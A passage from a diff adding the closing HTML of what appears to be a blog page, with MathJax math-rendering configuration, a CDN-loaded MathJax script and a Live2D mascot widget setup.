+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
